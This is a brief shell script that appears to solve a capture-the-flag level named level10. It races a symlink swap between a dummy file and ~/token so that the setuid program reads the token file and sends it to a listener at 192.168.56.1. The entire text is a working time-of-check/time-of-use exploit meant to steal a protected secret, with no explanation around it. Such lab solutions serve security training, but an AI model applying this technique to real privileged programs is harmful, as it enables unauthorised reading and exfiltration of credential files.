while :; do echo a > /tmp/a ; ln -sf ~/token /tmp/a; rm /tmp/a; done&
a=$!
sleep 0.2
./level10 /tmp/a 192.168.56.1
kill $a
